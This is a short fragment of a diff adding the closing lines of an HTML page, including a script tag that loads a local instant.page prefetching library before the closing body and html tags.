+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
